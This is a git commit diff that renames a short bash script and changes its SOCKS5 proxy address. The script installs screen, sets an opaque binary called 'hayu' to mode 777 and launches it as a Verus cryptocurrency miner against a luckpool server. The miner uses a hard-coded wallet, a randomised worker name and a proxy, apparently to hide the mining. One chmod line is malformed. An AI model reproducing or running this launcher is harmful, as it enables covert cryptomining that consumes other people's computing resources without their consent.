ebb0025327894014fba7bc469c451963dd1f8ab3
ajayy78 <87773034+ajayy78@users.noreply.github.com>
2021-07-23 06:07:02 +0700

    Update and rename gass.sh to udin.sh

--- udin.sh
+++ udin.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x gass.sh && chmod +x hayu chmod 777 hayu gass.sh
+chmod +x udin.sh && chmod +x hayu chmod 777 hayu udin.sh
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RT8DNmxnDDRCLScadn7efqKuDLFvrB9unv
 WORKER=$(echo $(shuf -i 1-10 -n 1)ojann)
-PROXY=socks5://174.64.199.79:4145
+PROXY=socks5://184.178.172.14:4145	
 ./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
